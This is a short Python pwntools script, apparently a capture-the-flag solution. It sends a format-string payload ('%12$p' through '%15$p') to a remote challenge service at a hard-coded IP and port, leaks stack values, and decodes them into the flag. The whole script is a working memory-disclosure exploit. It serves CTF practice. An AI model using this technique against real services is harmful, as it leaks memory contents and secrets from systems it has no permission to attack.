from pwn import *

# set correct ip and port
p = remote('51.124.222.205', 13370)


# leak starts at offset 12 and goes to 15
offset = 12

payload = b''
for i in range(offset, offset + 4):
        payload += b'%' + str(i).encode() + b'$p'
# payload = "%12$p%13$p%14$p%15$p"

p.recvuntil(b'I\'m going to Ljubljana tomorrow. What should I go take a look at?\n')
p.sendline(payload)
p.recvuntil(b'Wow, Ljubljana has ')

flag = ''

# just leaked hex to ascii conversion
for i in range(0, 4):
        leak = p.recv(18)
        while len(leak) < 18:
                leak = leak[:2] + b'0' + leak[2:]
        leak = leak.decode()[2:]
        #print(leak)
        part_of_flag = ''
        for i in range(0, len(leak), 2):
                byte = leak[i:i+2]
                if byte != '00':
                        part_of_flag = chr(int(byte, 16)) + part_of_flag
        flag += part_of_flag

print(flag)
p.close()
